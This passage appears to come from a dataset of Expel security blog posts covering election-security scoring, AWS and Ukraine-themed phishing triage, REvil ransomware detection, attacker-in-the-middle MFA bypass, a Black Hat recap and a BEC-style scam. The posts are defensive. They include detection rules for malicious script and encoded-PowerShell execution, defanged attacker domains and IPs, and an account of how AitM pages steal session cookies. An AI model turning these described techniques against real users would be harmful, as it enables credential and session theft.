and analysis capabilities SOC analysts and escalation paths The distinction between whats required for the overall voting ecosystem (that includes voter registration systems and vote reporting systems) versus whats required to secure just the voting machines is striking. While voter registration and vote reporting systems are essentially enterprise systems that can have commodity security technology installed for detection purposes, electronic voting systems are basically embedded systems. They have specialized hardware and software that requires vendor interaction and specialized processes to update. Plus, voting systems are offline for most of their lives and are generally not connected to a network even when theyre in use. Getting real-time telemetry off of them with software that most other security and analytic systems can understand is highly unlikely (and may put the system in more danger versus less). So for many of the Detect subcategories, scores will be pulled down due to the nature of offline voting systems in general. Some of the slack has been picked up by organizations like CYBERCOM . During the 2018 midterm elections (and to some extent in the 2016 elections as well) CYBERCOM monitored its SIGINT assets as well as worked with various public and private sector entities to monitor election night activities for bad actors. This point-in-time monitoring is useful for detecting threat actors that may be attempting to interfere with the voting itself, but doesnt necessarily address attacks against other parts of the ecosystem. So for subcategories like Detect  Continuous Monitoring 1: The network is monitored to detect potential cybersecurity events, most states would score a 2. U.S. Elections  Respond The Response Functional Area is a part of the NIST CSF many of us hope to never get to. If youre responding to an incident, then a bad thing already happened and youve got to deal with it. The reality for any enterprise is that youll eventually have to respond to security incidents. For election systems, we know from public reports that theyve been under attack for years. And some of these attacks have been successful, unfortunately. We should expect future elections to have similar issues. The good news is that because of past events, we see lots more coordination between various stakeholders than weve ever seen before. The federal civil and military agencies are actively communicating with state and local authorities. So for RS.CO-3 (Information is shared consistent with response plan) and RS.CO-4 (Coordination with stakeholders occurs consistent with response plan), scores are probably at least a solid 3 with some localities trending toward a 4. But how good is each plan itself (RS.RP-1)? That likely varies dramatically based on how far down into the process you are. While states have response plans at a strategic level, once you get to the local precincts, IR processes for local cyberattacks start to disappear. The saving grace is that mechanically poll workers are looking for anything out of the ordinary and run their local precincts according to a common set of procedures. So while theres no plan per se at that level, there are compensating controls that somewhat act as a plan. Score? Ill give them a 2, trending towards 3. And how well do we understand the impact (RS.AN-2)? Thats been a matter of national debate for the last several years. Regardless of the facts around specific incidents, its almost impossible for outsiders to find truth due to ideological and partisan differences. The current mechanisms for discovering and communicating the impact of cyber incidents is unfortunately woefully inadequate, resulting in a score of 1. U.S. Elections  Recover Finally, we get to the shortest Functional Area of the CSF: Recover. Once all is said and done, how well do you get back to normal operations? How well do you handle the public relations aspect to deal with the event that occurred? And are you able to refine your recovery activities based on what you learned from the last incident? Much like Respond, past events help drive improvements in this functional area. States have practices on recovery operations now and are able to (in some cases) restore services in a timely and accurate way. There are plenty of situations in which data is still lost  it takes diligence and attention to get recovery operations to be smooth and easy to execute. Score on recovery planning? Ill give this area a 2. Public relations is a large part of recovery (RC.CO-1 and 2). Again, like Response, recovery public relations relating to the election system isnt like public relations for a normal enterprise. The country is polarized and simply saying Everything is back to normal! may not be enough to satisfy most voters. Transparency is required and that isnt a strong trait of current election recovery operations. Well get there  but for now, were still at a 2. Next steps This was a quick, back-of-the-napkin attempt to apply the CSF to U.S. elections. Certainly wed benefit from a detailed analysis  using the CSF as the driving framework  of election systems in all 50 states. Shining a bright light on whats working and what needs help in our election systems would assist in driving funding decisions at all levels of our democracy. With that kind of common assessment, the public could make apples-to-apples comparisons between different systems and architectures in different states. Wed be able to monitor change over time and measure the progress being made by those responsible for the integrity of our elections. And over time, the public would put more trust in our election system. Who would do this and where would the funding come from? Thats a question that a blog post cant answer. However, I hope that what this post does provide is evidence that the NIST CSF offers value in systems of all shapes and sizes, including the national election systems. Security for the broader election supply chain That said, remember that local agencies and organizations that are leading these election operations are only part of the election security supply chain. Many peoples perceptions of the election process go something like this: They go vote at their local polling place, the magic happens and results show up on their nightly news a couple hours later. But the system is much larger than that  elections are about far more than the voting machine. Consider voter registration efforts and election rolls, the campaigns and special interest groups that disseminate information about candidates and issues and the reporting and validation of the results. If you consider all those distinct parts of the supply chain, there are plenty of opportunities for attack and the adversary can be lurking almost anywhere, whether thats at a polling place or behind a Twitter account. While state and local orgs play a role in a larger effort to protect our national elections, a NIST CSF-style assessment for all 50 states would be a fantastic step forward in making our future elections more secure.'}) (input_keys={'title'}),
  Example({'title': 'Attack trend alert: AWS-themed credential phishing technique', 'url': 'https://expel.com/blog/attack-trend-alert-aws-themed-credential-phishing-technique/', 'date': 'Feb 1, 2022', 'contents': 'Subscribe  EXPEL BLOG Attack trend alert: AWS-themed credential phishing technique Security operations  4 MIN READ  SIMON WONG AND EMILY HUDSON  FEB 1, 2022  TAGS: Cloud security / MDR / Tech tools The Expel Phishing team spotted something fishy recently. We came across a less common but well crafted Amazon Web Services (AWS)-themed phishing email that targets AWS login credentials. These emails have been reported in the past by security practitioners outside of Expel, but this is the first time our security operations center (SOC) encountered this technique. Now that weve seen this tactic in the wild, we wanted to share what we learned about this attack and how our SOC analysts triage malicious emails here at Expel. What happened Expels Phishing team reviews hundreds of emails a day and thousands of emails on a weekly basis; the vast majority of malicious emails we encounter are credential phishing attacks that are Microsoft themed. Why are they often Microsoft themed? We think its because Microsoft and Google have dominant market share and both tech giants have highly reputable brands. Their cloud platforms and offerings are reliable cloud infrastructures, which cover most businesses needs  like email, communications, and productivity applications. So this attack was interesting to us. Similar to Microsoft and Google, AWS is a popular cloud platform. If attackers were to obtain AWS credentials to an organizations cloud infrastructure, this can pose an immediate risk to their environment. On January 26, 2022, our customers user submitted a suspicious email for review. We picked it up and immediately turned the email into an investigation based on some highly suspicious indicators (well dive into those below) that were surfaced to our analyst by one of our bots, Ruxie . Based on these leads, we decided to dig into the submitted email for a closer look. How we triaged The way we triage emails here at Expel can be different from other managed security service providers. We use our platform, the Expel Workbench , to ingest user submitted emails. From there, based on detections and rules created by our team, the Expel Workbench gives context for why the email is suspicious. This context provides decision support for our analysts as they review the email. That way the analyst can focus on applying what we call OSCAR (orient, strategize, collect evidence, analyze, and report), and perform analysis with decision support from our bots. We walked you through how Expel analysts use OSCAR in a previous post here . Heres what we can capture from our initial lead by applying OSCAR. By orienting , we notice that Ruxie surfaced a suspicious link that isnt related to Amazon. And within the screenshot we noticed some poor grammar  theres no space in between account and requires. Weve also noticed these bad actors are always cordial by making use of words like kindly. The image below is a screenshot of the suspicious email. Suspicious email submitted to Expel Phishing Lets strategize next! There are two common phishing tactics we see when it comes to phishing. One is suspicious hyperlinks and the other is file attachments. In this case, Ruxie informed us that theres no attachment. But theres a suspicious hyperlink that needs to be reviewed.The image below shows the suspicious link surfaced by Ruxie in the Expel Workbench. Expel Workbench initial alert Next step: lets collect evidence. Wow, these bots are really helping us out here! Without the need to download the email file and open it in an email client for analysis, our bots do all the heavy lifting for us. Here Ruxie surfaces the URL, recognizes that there is a partial base64 string which looks to be an email address, and sanitizes that email address. Awesome! Ruxie actions in the Expel Workbench In a previous post , we mentioned how Expel managed phishing uses VMRay to analyze phishing emails. But not everyone has access to an advanced sandbox. Can you still analyze malicious emails? Absolutely! Well show you how to do this by using free tools like a simple web browser sandbox and the built in developer tools, which is one of our favorite methods of analysis. We recommend using Browserling , as this provides you with a safe environment to analyze suspicious hyperlinks. Well be using Mozilla and its developer tools as the web browser in this example. Follow these steps to access the developer tools: Navigate to the malicious domain. Let the landing page load. Note that this page is convincing if youre not careful, since the threat actor has cloned the page. Fake AWS sign-in page Enter the faulty credentials: myuser22@company.com Navigate to the browsers developer tools. Mozilla developer tools navigation Here is a side-by-side comparison of the two pages. As you can see, theyve cloned the AWS login page. If a user isnt careful in reviewing, theyll fall victim to this attack. Left: Real AWS login page. Right: Fake AWS login page There are few important HTTP methods, like GET request, you can use when youre attempting to get data from a web server. But what about when youre investigating where credentials are being stored? Youll want to follow the POST request traffic. This HTTP method is used to send data to the web server and most commonly used for HTTP authentication with PHP. After entering phony credentials we see the POST request is storing the credentials to the same domain. Now we can scope using this indicator as evidence to identify potential account compromises. Mozilla developer tool In addition to our awesome bots (can you tell we love our bots here at Expel?), we also have automated workflows that are built into the Expel Workbench that can help our analysts be more efficient by reducing cognitive loading for triaging emails. By running our domain gather query we observed no evidence of traffic to the malicious credential harvesting domain, which suggests no signs of compromise! Whew! Last but not least, we can now record that there was no evidence of compromise in our findings as a part of the investigation. Ruxie analysis that displays any POST requests made to the fake AWS webpage across the customers environment Although tech is great and can help us be more efficient at running down investigations related to credential harvesting, its not always necessary and we can still achieve the same goal manually. The technique we just walked you through in this post can be applied to triaging any suspicious credential harvesting email. How you can keep your org safe AWS users are just as vulnerable to credential phishing attacks as Microsoft users. And if an AWS user falls victim to phishing emails and social engineering techniques, putting their credentials in the hands of an attacker, theres a chance youll be dealing with a cloud breach. Here are a few ways you can remediate if your AWS account was compromised: Reset Root/IAM user credentials. Disable, delete, or rotate access keys. Audit permissions and user activity through the use of CloudTrail. Enable AWS multi-factor authentication on user accounts. We hope you found this post helpful! Have questions or want to learn more about how the Expel Phishing team works? Lets chat (yes  with a real human).'}) (input_keys={'title'}),
  Example({'title': 'Attack trend alert: Email scams targeting donations to Ukraine', 'url': 'https://expel.com/blog/attack-trend-alert-email-scams-targeting-donations-to-ukraine/', 'date': 'Mar 24, 2022', 'contents': 'Subscribe  EXPEL BLOG Attack trend alert: Email scams targeting donations to Ukraine Security operations  5 MIN READ  HIRANYA MIR, JOSE TALENO AND SIMON WONG  MAR 24, 2022  TAGS: MDR / Tech tools As the Russian invasion of Ukraine continues, many people around the world are looking for opportunities to donate to Ukrainian relief efforts. For scammers, this presents an opportunity to prey on peoples well-intentioned desire to help. Recently, weve seen an increase in phishing emails masquerading as Ukrainian cryptocurrency and charitable apparel organizations. In this post, well show you what these emails look like and how to spot the tell-tale warning signs to ensure your donations are going to help those in need. Its both unsurprising and horrible that there are people out there trying to take advantage of the situation. We are not discouraging anyone from donating but, since there are bad actors at play, we do encourage people to verify their donations are going to a legitimate place to help those in need. Crypto scam emails If youre thinking about donating cryptocurrency to help victims in Ukraine, its important to be aware of potential scam techniques before you hit send. Especially if youre prompted to donate via email solicitation, rather than seeking out a public wallet address associated with donation efforts. If you receive an email claiming to represent a charitable organization accepting crypto donations, there are some key clues to indicate whether its genuine or not. The email below is a recent example of a crypto scam email: Crypto scam email Our first clue that things are amiss? The name and address listed in the From field. Lets zoom in a bit more Email headers and signature field The doctors name listed on the From field (Dr.Maxim Aronov), doesnt match the email address listed on the From field (fontbadia@). Also, the email address provided in the signature field, maximaronov40@gmail[d]com, isnt associated with the childrens clinic. If we look up the email reputation for maximaronov40@gmail[d]com we can see that this address isnt linked to any social media profiles on major services like Facebook, LinkedIn, and iCloud. While this could also mean this is a new email address, its also suspicious. Next, lets inspect the public wallet address listed in the email body. (Weve hidden the wallet address but for anyone wondering, it was an Ethereum public address.) Crypto transactions are stored on the blockchain  leaving us a nice digital footprint of transaction activity associated with a public wallet address. You can review the transaction history of a public address using block chain explorer sites like blockchain.com and Polkascan. Below is the transaction history of the public wallet address listed in the email body: Public Ethereum address transaction history What stands out? This public wallet address has recorded zero transactions. When donating crypto to Ukrainian relief efforts, be wary of public addresses with minimal transaction history and low balances. Would you buy an expensive watch from a seller on Ebay with zero transaction history? Probably a red flag, right? The same applies to crypto donations. For a comparison, the Ukraine governments (verified) Twitter account shared three cryptocurrency wallet addresses  a Bitcoin wallet address, Ethereum wallet address, and Polkadot address. Below is the transaction history for the Bitcoin public address 357a3So9CbsNfBBgFYACGvxxS6tMaDoa1P: BTC transaction history for 357a3So9CbsNfBBgFYACGvxxS6tMaDoa1P This public wallet address has recorded tens of thousands of transactions and is labeled as a Ukraine Donation Address. This is a stark contrast to the transaction history of the Ethereum public wallet address listed in the email body. The bottom line? If youre thinking about donating crypto, double-check the public address and transaction history before hitting send. You can review the transaction history of a public address using block chain explorer sites like blockchain.com and Polkascan. Be wary of public addresses with minimal transaction history and low balances. Also, perform a quick Google search of the public address. If its not linked to Ukraine crypto donation efforts, thats a tell-tale sign that something is wrong. Fake charitable apparel emails Scammers dont just target people wanting to donate. They also target people looking to show their support. If youre thinking about buying apparel to support Ukraine, here are a couple of things to lookout for before you hit buy it now. Heres a recent phishing email investigated by our SOC: Fake charitable apparel email Our first clue that something just doesnt feel right? The email address listed in the From field has no online presence according to our friends at EmailRep . Now focusing on the email body, if we were to click the Click Here to View hyperlink, that would connect our web browser to a domain hosted at u.danhramvaiqua[d]xyz. Email hyperlink For some quick context, the .xyz top-level domain has a history of domain abuse . Were in no way saying that all websites using the .xyz top-level domain lead to bad things, but used in this way  its certainly enough to grab our analysts attention. Lets take a look at the website reputation for u.danhramvaiqua[d]xyz. Reviewing a websites reputation is a great way to understand if a specific IP, URL, or domain name has a negative reputation or if its been categorized as malicious. There are a number of free resources you can use. Submit the domain and review the results. Its that easy. Here are a couple of our favorites: Symantec Site Review URLVoid Talos IP and Domain reputation Webpulse Site Review classified the u.danhramvaiqua[d]xyz domain as phishing. Webpulse domain reputation results So far, we have an email address with no digital presence sending an email with a hyperlink that points to a .xyz domain that has a reputation of phishing. This is enough evidence to make the decision to either delete the email in question or forward it on to your IT team for further review. But for folks looking to go an additional step, lets take a look at what happens when we load the u.danhramvaiqua[d]xyz page in a sandbox and browse the URL as if a user visited that page. Well use URLScan  another free online resource. URLscan provided us the effective URL (where the domain is pointing to), provided us screenshots by loading the page (which it does if the page is active), and even let us know Cloudflare issued a TLS certificate for the site on February 28, 2022. The biggest takeaway is that if a user were to click the Click Here to View hyperlink, theyd be redirected to www[d]mimoprint[d]shop. URLscan results You may be asking, should I look up the website reputation for www[d]mimoprint[d]shop? Absolutely! Spoiler: Its got a bad reputation. If youre considering a donation to support victims of the crisis in Ukraine, be aware of the prevalence of scams at play to make sure your donations are actually going to help those in need. We strongly recommend using official channels to make donations and researching your options before you hit send or buy it now. Things you can do to spot potential scam emails Before clicking on hyperlinks, hover over them and check where that URL may lead you. Report suspicious emails to your security team and avoid interacting with any unsolicited emails. Ensure your org conducts frequent security awareness training sessions and that theyre adapted to current events that might be used to mislead your end-users. Make sure your org has a good security email gateway product in place for protection. Have questions about scams like these, or want to learn more about the Expel Phishing team? Reach out any time.'}) (input_keys={'title'}),
  Example({'title': 'Attack trend alert: REvil ransomware', 'url': 'https://expel.com/blog/attack-trend-alert-revil-ransomware/', 'date': 'Feb 17, 2021', 'contents': 'Subscribe  EXPEL BLOG Attack trend alert: REvil ransomware Security operations  3 MIN READ  JON HENCINSKI AND MICHAEL BARCLAY  FEB 17, 2021  TAGS: MDR Over the past week, Expel detected ransomware activity targeting law firms attributed to REvil, a Ransomware-as-a-service (RaaS) operation. In this post, well share more about REvil, how we detected this latest attack and what you can do to make your own org more resilient to a REvil attack. What is REvil? REvil is a well-known ransomware group operating a Ransomware-as-a-Service (RaaS) program since early 2019. Given that initial access to a target organization is the job of RaaS affiliates contracted by the core REvil group, the delivery and initial infection vectors vary. But theyve been known to include phishing, the exploitation of known vulnerabilities in publicly accessible assets and collaboration with botnet owners who sell existing infections to REvil affiliates. In recent REvil campaigns , attackers deployed a modified version of Cobalt Strikes BEACON agent to compromised systems before escalating privileges and moving laterally in the target environment. Once REvil has administrator-level privileges inside an organization, theyll deploy REvil ransomware, aka SODINOKIBI or BLUECRAB. Whats new about this particular REvil campaign? This most recent campaign is similar to activity we saw in fall 2020, where users visit a number of compromised yet legitimate third-party websites and are redirected to a Question &amp; Answer (Q&amp;A) forum instructing them to download a ZIP file that contains a malicious JScript file. It appears as though users werent directed to these fake forum posts via phishing emails, but instead through their own Google searches. This suggests that the attackers responsible for this campaign invested considerable effort into boosting these malicious pages higher in Google result rankings. Many of these pages align with themes related to legal topics, while others talk about international defense agreements or even cover letter samples. In short, theres a wide range of topics being showcased on these various sites. The JScript file, when run, deploys a BEACON stager to the system. So far weve seen REvil targeting users in Germany and in the United States. How to detect REvil activity in your own environment There are a few activities you can alert on in an effort to detect REvil activity: Alert when you see wscript.exe or cscript.exe execute a .vbs, .vbscript or .js file from a Windows user profile. If this generates too many false positives, try adding the condition where the wscript.exe or cscript.exe process also initiates an external network connection. Alert when wscript.exe or cscript.exe execute a .vbs, .vbscript or .js file from a Windows user profile and the process spawns a cmd.exe process. Alert when you see Windows PowerShell execute a base64 encoded command and the process initiates an external network connection. REvil process example How to remediate if you think youre affected #1: Contain the host(s) Isolate the host in question to remove attacker access. #2: Start the re-image Attempting to manually clean the fileless persistence mechanism used by this campaign may lead to re-infection on startup if not done properly. Thats why re-imaging is critical. #3: Scope the environment for additional infections The PowerShell command executed as part of this activity occurs at the time of initial installation as well as at startup after persistence is established. This means that its extremely important to determine when the initial download of the zipped JScript file occurred and compare that to the timestamp associated with the detected PowerShell activity. Network traffic destined for known command and control domains also provides a good way to timeline activity related to this campaign in your environment. If you discover that this infection persisted in your environment for more than a short period of time, its possible that attackers already moved laterally within your environment and/or escalated their privileges within your Active Directory Domain. RaaS actors typically wait until they have the privileges necessary to deploy ransomware to a large portion of your environment at once before moving on from the persistent implant portion of the attack lifecycle and actually deploying ransomware. How to protect yourself against a REvil ransomware attack There are actions you can take in your environment today to better protect your org against a REvil ransomware attack: Configure Windows Script Host (WSH) files to open in Notepad Prevent the double-click of evil JavaScript files. Configure JScript (.js, .jse), Windows Scripting Files (.wsf, .wsh) and HTML for application (.hta) files to open with Notepad. By associating these file extensions with Notepad, you mitigate common remote code execution techniques. Pro tip: PowerShell files (.ps1) already open by default in Notepad. Enable PowerShell Constrained Language mode Constrained Language mode mitigates many PowerShell attacks by removing advanced features that these attack tools rely on such as COM access and .Net and Windows API calls. The language mode of a PowerShell session determines which elements can be used in the session. Dont expose RDP directly to the internet Dont expose RDP services directly to the internet. Instead, consider putting RDP servers or hosts behind a VPN thats backed by two-factor authentication (2FA). Create and test backups of data Consider creating and testing backups of data within your org as part of your IT policy. Regularly creating valid backups that arent accessible from your production environment will minimize business disruptions while recovering from ransomware attacks or data loss. Want to find out when we share updates from our SOC on attack trend alerts just like this one? Subscribe to our EXE blog to get our latest posts sent directly to your inbox.'}) (input_keys={'title'}),
  Example({'title': 'Attacker-in-the-middle phishing: how attackers bypass MFA', 'url': 'https://expel.com/blog/attacker-in-the-middle-phishing-how-attackers-bypass-mfa/', 'date': 'Nov 9, 2022', 'contents': 'Subscribe  EXPEL BLOG Attacker-in-the-middle phishing: how attackers bypass MFA Security operations  4 MIN READ  ANDREW BENTLE  NOV 9, 2022  TAGS: MDR TL;DR: Credential phishing is an established attack mode, but multi-factor authentication (MFA) made it much harder on hackers. A new tacticcalled attacker-in-the-middlecan be effective at end-running MFA defenses. This case examines a recent AitM attack on one of our customers and provides useful advice on how to detect it in your own environment. Credential phishing is nothing newfooling users into giving away their logins and passwords has been hackers bread and butter forever. But until recently the effects of credential phishing could be mitigated by using multi-factor authentication. The attacker might get a password, but the second factor is a lot more difficult. Also not new: attackers finding techniques to bypass security measures. One popular way around MFA is known as attacker-in-the-middle (AitM), where the user is tricked into accepting a bogus MFA prompt. What happened? AitM techniques look identical to regular credential phishing at first. Typically, an email directs the user to a fake login page, which steals credentials when the user attempts to sign in. With normal credential phishing, this fake login page has served its purposeit stores the credentials and the attacker will attempt to use them at a later time. AitM phishing does something different, though; it automatically proxies credentials to the real login page, and if the account requires MFA users get prompted. When they complete the MFA, the web page completes the login session and steals the session cookie. As long as the cookie is active, the attacker now has a session under the victims account. Our SOC recently saw this technique used to bypass MFA and detection in a customers environment. The attackers harvested a users credentials and login session into their organizations Microsoft 365 portal using AitM techniques. The attacker evaded detection for 24 days until a suspicious Outlook rule was made in the compromised users inbox. Our analysts identified the source IP as a hosting provider and noticed that no login events were seen from the IP address. They followed the related session ID to its earliest date and found that the session originated from another IP address, 137[.]220[.]38[.]57, nearly a month before. This address is related to a hosting provider (Vultr Holdings) and was anomalous for the user account. But something stranger was going on: not only was MFA satisfied from this login, but it was also supported by the Active Directory (AD) agent on the users host. This didnt make sensehow could a login from a random hosting provider IP address use the AD agent tied to the users managed host? This is something we might see when a user logs in while using a VPN or proxy, but our analysts OSINT research and Expels automatic IP enrichment didnt connect this address with a VPN provider, so we kept digging. We checked logs from their Palo Alto firewall and DNS requests from the host in Darktrace and found DNS requests to rnechcollc[.]com with DNS A records pointing to 137[.]220[.]38[.]57, the same IP the first login was from. The rnechcollc[.]com site hosted an AitM credential harvesting page that proxied the credentials (and even the AD agent authentication from the users on-premises host through the Vultr Holdings infrastructure and onto the organizations Microsoft 365 portal). The page then recorded the session cookie and the attacker continued the active session from a VPN provider for the next 24 days. Confirming AitM in your environment AitM can be tricky to confirm, especially without network logs. But there are a few ways to investigate if a compromise originated from an AITM credential harvesting page. Investigating using only cloud logs: this is the worst-case scenario. All you have are the logs from the cloud providers, be it Okta, Microsoft 365, or any number of other platforms, and the goal will be to determine the initial login IP address by following the session ID back to its earliest point. The initial login will likely, but not necessarily, be from an IP address associated with a hosting provider. Check passive DNS entries associated with the IP address (VirusTotal and PassiveTotal are good tools for this). Check the reputation on the recent DNS entries related to the IP address through OSINTit may be a known indicator of AitM, as was the case with the rnechcollc[.]com domain. Investigating using network and cloud logs: like the above method, youll need to identify the initial login IP address through cloud logs. Follow the session ID back to the initial login and take note of the IP address. Check your firewall logs for URLs associated with the IP address. Confirming connections from within your environment to phishing domains associated with the initial login IP address is a strong indicator of AitM methodology. Investigating using EDR and cloud logs: again, identify the initial login IP address through the cloud logs. Follow the session ID back to the initial login and take note of the IP address for the initial login. Check EDR logs for network connections to the IP address. Some EDRs, like CrowdStrike and Defender for Endpoint, will record domain names related to IP connections. Confirming connections from within your environment to phishing domains associated with the initial login IP address is a strong indicator of AitM methodology. Things you can do to keep your org safe Dont discount the effectiveness of MFA still one of the single most effective security tools that can be implemented in your organization. While AitM can bypass MFA, it represents a small portion of the credential phishing weve seen in the wild to date. Consider implementing policies to shorten the time that session tokens can remain active; if attackers lose their sessions, theyll need to re-phish the user to get it back, or at least get them to accept another MFA prompt. Implement conditional access policies to prevent logins from unwanted countries, noncompliant devices, or untrusted IP spaces. Additionally, services like our Managed Phishing can identify malicious credential harvesting emails and inform your team of campaigns in your organization and help block attacks before they succeed.'}) (input_keys={'title'}),
  Example({'title': 'Back in Black (Hat): Black Hat USA 2022Day 1 Recap', 'url': 'https://expel.com/blog/black-hat-usa-2022-day-1-recap/', 'date': 'Aug 11, 2022', 'contents': 'Subscribe  EXPEL BLOG Back in Black (Hat): Black Hat USA 2022Day 1 Recap Expel insider  4 MIN READ  ANDY RODGER  AUG 11, 2022  TAGS: Company news Black Hat is more than a collection of successful events held around the world; its a community. And if you needed a reminder of that fact, Black Hat USA 2022 will shake those cobwebs free! While Black Hat did hold its 2021 event at Mandalay Bay in Las Vegas, this year brings more people, more exhibitors, and more energy. From the moment Jeff Moss, founder of Black Hat, took the stage during the first keynote, community has been a common thread throughout the presentations. Moss kicked things off noting that 2022 marks the 25th year of Black Hat USA, and brought the crowd back in time to the conferences humble origins. At that time, Moss simply reached out to folks in his network to see if theyd want to speak. (Did you know that he considered calling the event The Network Security Conference?) Over the last quarter-century, the community of security practitioners has grown right alongside the expanding threat landscape. Until recently, Moss had thought there were three teams when it came to cybersecurity: Team Rule of Law, Team Undecided, and Team Authoritarian. Some teams were following the rules, others were limiting access to information, and there were even a few more somewhere in the middle. But now he sees a new team: a community of super-empowered individuals and organizations. These were people much like the attendees of Black Hat, who take action to right the wrongs in the world. For example, Moss noted how some companies simply stopped doing business with Russian companies in the wake of the Ukraine invasion. Some turned off access by Russian companies to their services and others shut down their websites. He used this example to remind attendees that this community has a significant influence in the world. Following Moss was Chris Krebs of the Krebs Stamos Group, and former director of the Department of Homeland Securitys Cybersecurity and Infrastructure Security Agency (CISA). Krebs spoke about his time wandering the wilderness over the past few years, and talking to people in and outside the U.S. across a range of roles about their security challenges and concerns. He kept hearing three questions: Why is it so bad right now? What do you mean its going to get worse? What can we do about it? These arent easy questions to answer, but he sees the solution in this community of people who have the ability to make positive changes based on its principles. Krebs covered a lot of ground during his roughly 45 minutes on stage, but if there was a single takeaway, its that he holds a lot of hope for cybersecurity and its role in improving the world. Black Hat explores those huge macro issues, but it also looks at smaller ones, toothe ones that practitioners face day-in and day-out to better protect their organizations. Kyle Tobener led a session on taking a harm reduction approach to cybersecurity best practices. Did you know that most organizations security teams employ a use reduction approach to security best practices? To quote the Five Man Electrical Band song Signs: Do this, dont do that, cant you read the signs? Tobener argued that simply telling people what to do isnt effective. In fact, he shared research that showed how this approach can have the opposite effect. He instead advocates for harm reduction, a commonly used approach in healthcare. Harm reduction offers a set of practical strategies and ideas aimed at reducing the negative consequences associated with various human behaviors. It focuses on the outcomes, not the original behaviors. His advice? Remove dont do that from your vocabulary. Replace it with, Try not to do that, but if you do, then here are some ways to be safe. Adam Shostack of Shostack and Associates took the stage virtually in his session titled, A Fully Trained Jedi You Are Not. Shostack pointed out that while the Star Wars movies usually focused on the Jedi and their contribution to the rebellion, non-Jedi characters made huge contributions. He emphasized that the field of cybersecurity needs people of all different skill sets and experience levels, and the field isnt limited to Jedi-level cybersecurity masters. Instead he shared that a mix of more targeted training and education combined with an effort to shift left (incorporating security into the development process) can solve a lot of cybersecurity issues and better support developers and security personnel alike. After all, it takes more than Jedi knights for a successful rebellion. Burnout can have a major impact on cybersecurity professionals. Stacy Thayer, Ph.D., knows this all too well, and shared her knowledge on the topic in her session, Trying to be Everything to Everyone: Lets Talk About Burnout. A number of factors contribute to burnout in cybersecurity. Dr. Thayer named a few: High levels of mental workload Anticipating cyber-attacks A shortage in staffing and an increase in workload A struggle to find ones place within the organization Work is often not appreciated in the organization Dr. Thayer says that the usual advice for dealing with burnout is completely ineffective. Take a vacation? Sure! Ill just have more work waiting for me when I get back. Go to the gym? Okay, I feel like absolute garbage but sure lets get on the treadmill! Stop caring so much? Not possible! According to Dr. Thayer, the more that you learn about yourself and your relationship with burnout and your hidden triggers, the better youll be at managing it. These are just a few of the topics that presenters covered on day one of the event. Presenters and attendees shared so much more in sessions and on the business hall floor, but if theres anything thats obvious about Black Hat USA 2022, its that the community here is alive and well, and poised for great things.'}) (input_keys={'title'}),
  Example({'title': 'BEC and a Visionary scam', 'url': 'https://expel.com/blog/bec-and-a-visionary-scam/', 'date': 'Jan 10, 2023', 'contents': 'Subscribe  EXPEL BLOG BEC and a Visionary scam Tips  2 MIN READ  SHARON BURTON  JAN 10, 2023  TAGS: MDR What does business email compromise (BEC) have to do with the vanity anthology scam? To be part of this exciting project, all you have to do is pay $700 by Jan 1! Im a writer. Im also a woman in tech. When I saw the call for writers in a Reddit channel, looking for women in tech to write an essay about their career for an upcoming book, I was interested. Very interested. I filled out the Google form. On December 22, I got a group email announcing a project meeting at 6pm that day. A little short notice and the message didnt indicate the time zone, but OK. Responding back to the group, I clarified the time zone and decided I could attend. We met on Google Teams. The woman running the meeting seemed uncertain how to work a virtual meeting, which seemed strange because she billed herself as the chief information officer (CIO) of a large organization and, well, its 2022. Were always learning! she announced to the 20 or so women as she struggled to get the video and screen share to work. She devoted the first 15 minutes of the presentation to her professional background, which demonstrated that she was a Visionary. She even referred to herself that way on the typo-ridden slides. Visionary, upper case. She covered the many benefits of the book project for this select group. Visibility in our profession, authority, marketing, inspiration, you cant be what you cant see. Our stories would inspire generations. Generations. By the time she got to the part where we needed to give her $700 nonrefundable dollars by Jan 1st to be included in this inspiring projector $100 now and three easy payments!I knew we were in the middle of a scam. Specifically, the vanity anthology scam . Most professional writer organization websites cover it in detail. Different con, same rules So why should this story interest cybersecurity people? Im fortunate to work for a security company. When this scam presented itself, Id just completed our annual internal security training, and was hyper-vigilant about everything, so I saw this swindle for what it was. Because were assaulted by an array of ad, marketing, economic, and partisan pitches every day, weve evolved pretty good BS detectors. But scammers are evolving too. In this case, the Visionary employed tactics very similar to what we commonly see in BEC scams. Sense of urgency: the first meeting happened just as most people were starting their holiday break, with all the bustle that goes with it. We were given about six hours notice of the meeting. Payment was due in a week. This was all very fast during a time of year where people are already overloaded with commitments and tasks. Typos and other language issues: writers are especially sensitive to typos and dropped words because, well, words are our air. The slides had typos and missing words. Not what I expect of a CIO. Uncertainty in using basic tech: the Visionary didnt know how to share her screen initially. In 2022. After two years of remote pandemic work. Additionally, she was a CIO. A basic familiarity with simple conferencing and presentation is expected. And this was for women in tech, so technological ability should be inherent. Person of authority: She used her rsum to assert credibility and emphasized how important the Visionary is in the world of tech. Too good to be true: being included in this project would enhance our careers and inspire generations. She said the volume would be an Amazon Best Seller. Thats a lot for any book, much less one thats essentially self-published. In the end, the message is that people are people and bad guys are bad guys. The lessons we learn from real life apply to the cyber world, and vice versa. My awareness of BEC tactics helped me sniff out the Visionarys grift. Take your sensitivity to the iffy product and service claims you encounter in everyday life with you when you log in. And maybe thats how we inspire generations.'}) (input_keys={'title'}),
  Example({'title': 'Behind the scenes: Building Azure integrations for ASC alerts', 'url': 'https://expel.com/blog/building-azure-integrations-asc-alerts/', 'date': 'Feb 9, 2021', 'contents': 'Subscribe  EXPEL BLOG Behind the scenes: Building Azure integrations for ASC alerts Engineering  12 MIN READ  MATTHEW KRACHT  FEB 9, 2021  TAGS: Cloud security / MDR / Tech tools If youve read the Azure Guidebook: Building a detection and response strategy , you learned that weve built our own detections and response procedures here at Expel. Missed the guidebook? Download it here But what we didnt share in that guidebook is how we figured a lot of those things out. Anytime you learned some lessons the hard way, it makes for a long story; which is exactly what Im sharing with you here. This story begins with our need to replace a third-party tool we were using to pull logs from various cloud providers. Building it ourselves gave Expel new access to data, improved monitoring and ended up allowing us to update our entire detection strategy for Azure Security Center (ASC) alerts and Azure in general. Over the years that third-party application started to creak and groan under the pressure of our needs. Something needed to change. Lets connect Thats where I came in. (Hi! Im Matt and Im a senior software engineer on Expels Device Integrations [DI] team.) Building an integration isnt a simple or linear process. Its why we warned Azure guidebook readers to go into the process with eyes wide open. Its also why we harp on the importance of team communication. Ill walk you through how we built an integration on top of Azure signal to help our analysts do their jobs effectively and share some lessons learned along the way. Finding the right signal At Expel, building an integration is a collaborative effort. The DI team works with the Detection and Response 